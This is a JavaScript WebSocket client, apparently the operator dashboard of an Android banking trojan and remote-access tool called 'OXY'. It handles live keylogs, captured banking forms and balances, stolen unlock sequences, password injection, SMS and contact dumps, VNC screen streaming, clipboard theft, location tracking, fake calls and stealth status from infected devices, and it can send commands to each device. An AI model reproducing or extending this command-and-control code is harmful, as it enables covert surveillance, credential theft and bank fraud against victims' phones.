import useStore from './store/index.js';

const WS_URL = (location.protocol === 'https:' ? 'wss' : 'ws') + '://' + location.host + '/dashboard';
const AUTH   = '';  // set to token if AUTH_TOKEN is configured on server

class OxyWS {
  constructor() {
    this._ws          = null;
    this._reconnTimer = null;
    this._pingTimer   = null;
    this._pingStart   = 0;
    this._vncDeviceId = null;
    // Registered raw message listeners (for camera/audio in sub-components)
    this._msgHandlers = new Set();
    // Binary frame handlers
    this._binHandlers = new Set();
  }

  connect() {
    if (this._ws && this._ws.readyState < 2) return;
    const url = AUTH ? `${WS_URL}?token=${AUTH}` : WS_URL;
    const ws  = new WebSocket(url);
    ws.binaryType = 'arraybuffer';
    this._ws = ws;

    ws.onopen = () => {
      useStore.getState().setConnected(true);
      useStore.getState().pushEvent({ type: 'sys', text: '🟢 Conectado ao servidor OXY', ts: Date.now() });
      clearTimeout(this._reconnTimer);
      // keepalive every 20s
      this._pingTimer = setInterval(() => {
        this._pingStart = Date.now();
        this._send({ type: 'ping' });
      }, 20_000);
    };

    ws.onclose = () => {
      useStore.getState().setConnected(false);
      clearInterval(this._pingTimer);
      this._reconnTimer = setTimeout(() => this.connect(), 2000);
    };
    ws.onerror = () => {
      ws.close();
    };

    ws.onmessage = (e) => {
      if (e.data instanceof ArrayBuffer) {
        // Raw JPEG VNC frame
        for (const h of this._binHandlers) { try { h(e.data, this._vncDeviceId); } catch (_) {} }
        return;
      }
      let msg;
      try { msg = JSON.parse(e.data); } catch (_) { return; }
      // Deliver to raw message listeners (sub-components)
      for (const h of this._msgHandlers) { try { h(msg); } catch (_) {} }
      // Core dispatch
      this._dispatch(msg);
    };
  }

  // ── Public API ─────────────────────────────────────────────────────────────
  send(msg) { this._send(msg); }

  command(deviceId, action, params = {}) {
    this._send({ type: 'command', device_id: deviceId, action, ...params });
  }

  subscribe(stream, deviceId) {
    this._send({ type: `subscribe_${stream}`, device_id: deviceId });
  }

  unsubscribe(stream, deviceId) {
    this._send({ type: `unsubscribe_${stream}`, device_id: deviceId });
  }

  // Register a handler for ALL parsed JSON messages — returns unsubscribe fn
  onMessage(handler) {
    this._msgHandlers.add(handler);
    return () => this._msgHandlers.delete(handler);
  }

  // Register a handler for binary VNC frames — returns unsubscribe fn
  onBinary(handler) {
    this._binHandlers.add(handler);
    return () => this._binHandlers.delete(handler);
  }

  // ── Internals ──────────────────────────────────────────────────────────────
  _send(msg) {
    if (this._ws?.readyState === WebSocket.OPEN) {
      this._ws.send(typeof msg === 'string' ? msg : JSON.stringify(msg));
    }
  }

  _dispatch(msg) {
    const store = useStore.getState();

    switch (msg.type) {
      case 'pong': {
        if (this._pingStart) store.setLatency(Date.now() - this._pingStart);
        this._pingStart = 0;
        break;
      }
      case 'device_list': {
        store.setDevices(msg.devices || []);
        break;
      }
      case 'online_set': {
        store.setOnlineIds(msg.device_ids || []);
        break;
      }
      case 'stats': {
        store.setStats(msg.data || {});
        break;
      }
      case 'device_online': {
        store.markOnline(msg.device_id);
        store.upsertDevice({ device_id: msg.device_id, is_online: 1, ip_address: msg.ip || '' });
        store.pushEvent({ type: 'online', text: `📱 Dispositivo online: ${msg.device_id}`, ts: msg.ts });
        break;
      }
      case 'device_offline': {
        store.markOffline(msg.device_id);
        store.updateDeviceField(msg.device_id, { is_online: 0 });
        store.pushEvent({ type: 'offline', text: `📴 Dispositivo offline: ${msg.device_id}`, ts: msg.ts });
        break;
      }
      case 'device_info': {
        const d = { ...msg.data, device_id: msg.device_id, is_online: 1 };
        store.upsertDevice(d);
        if (msg.device_id === store.selectedId) store.updateDeviceField(msg.device_id, msg.data);
        break;
      }
      case 'device_status': {
        const fields = { current_app: msg.package, current_app_name: msg.appName,
          is_locked: msg.isLocked ? 1 : 0, is_screen_on: msg.isScreenOn ? 1 : 0 };
        if (msg.batteryLevel !== undefined) fields.battery_level = msg.batteryLevel;
        store.updateDeviceField(msg.device_id, fields);
        break;
      }
      case 'keylog': {
        if (msg.device_id === store.selectedId)
          store.appendKeylog({ raw: msg.data, app_context: msg.app || '', ts: msg.ts });
        store.pushEvent({ type: 'keylog', text: `⌨ [${msg.device_id}] ${(msg.data || '').slice(0, 80)}`, ts: msg.ts });
        break;
      }
      case 'keylog_batch': {
        store.pushEvent({ type: 'keylog', text: `⌨ [${msg.device_id}] ${msg.count} keylogs offline recebidos`, ts: msg.ts });
        break;
      }
      case 'bank_balance':
      case 'form_capture': {
        store.pushEvent({ type: 'bank', text: `🏦 [${msg.device_id}] Captura bancária — ${msg.bank || '?'}`, ts: msg.ts });
        if (msg.device_id === store.selectedId) store.refreshBanking();
        break;
      }
      case 'unlock_sequence': {
        store.pushEvent({ type: 'unlock', text: `🔓 [${msg.device_id}] Desbloqueio capturado: ${msg.utype}`, ts: msg.ts });
        if (msg.device_id === store.selectedId) store.refreshBanking();
        break;
      }
      case 'inject_password': {
        store.pushEvent({ type: 'inject', text: `💉 [${msg.device_id}] Inject: ${msg.data?.app || '?'}`, ts: msg.ts });
        if (msg.device_id === store.selectedId) store.refreshBanking();
        break;
      }
      case 'sms_update': {
        store.pushEvent({ type: 'cmd', text: `💬 [${msg.device_id}] ${msg.count} SMS recebidos`, ts: msg.ts });
        if (msg.device_id === store.selectedId) store.refreshSms();
        break;
      }
      case 'contacts_update': {
        store.pushEvent({ type: 'cmd', text: `👤 [${msg.device_id}] ${msg.count} contatos recebidos`, ts: msg.ts });
        if (msg.device_id === store.selectedId) store.refreshContacts();
        break;
      }
      case 'apps_update': {
        store.pushEvent({ type: 'cmd', text: `📱 [${msg.device_id}] ${msg.count} apps sincronizados`, ts: msg.ts });
        if (msg.device_id === store.selectedId) store.refreshApps();
        break;
      }
      case 'vnc_status': {
        store.updateDeviceField(msg.device_id, { vnc_active: msg.active ? 1 : 0 });
        if (msg.device_id === store.selectedId) store.setVncActive(msg.active);
        store.pushEvent({ type: 'vnc', text: `🖥 [${msg.device_id}] VNC ${msg.active ? 'INICIADO' : 'PARADO'}`, ts: msg.ts });
        break;
      }
      case 'vnc_meta': {
        // Next message will be binary JPEG for this device
        this._vncDeviceId = msg.device_id;
        break;
      }
      case 'inject_status': {
        if (msg.device_id === store.selectedId) store.setInjectActive(msg.package_name, msg.enabled);
        break;
      }
      case 'stealth_status': {
        store.updateDeviceField(msg.device_id, { threat_level: msg.threatLevel || 0 });
        break;
      }
      case 'nfc_scan': {
        store.pushEvent({ type: 'nfc', text: `📡 [${msg.device_id}] NFC scan: ${msg.data?.uid || '?'}`, ts: msg.ts });
        break;
      }
      case 'location': {
        store.pushEvent({ type: 'loc', text: `📍 [${msg.device_id}] ${msg.lat?.toFixed(5)}, ${msg.lng?.toFixed(5)}`, ts: msg.ts });
        break;
      }
      case 'command_issued': {
        store.pushEvent({ type: 'cmd', text: `→ [${msg.device_id}] ${msg.action} ${msg.sent ? '✓' : '✗'}`, ts: msg.ts });
        break;
      }
      case 'fake_call_status': {
        store.pushEvent({ type: 'cmd', text: `📞 [${msg.device_id}] Fake call: ${msg.status} — ${msg.callerName || ''}`, ts: msg.ts });
        break;
      }
      case 'clipboard': {
        store.pushEvent({ type: 'cmd', text: `📋 [${msg.device_id}] Clipboard: ${(msg.text || '').slice(0, 60)}`, ts: msg.ts });
        break;
      }
      default:
        break;
    }
  }
}

export const ws = new OxyWS();
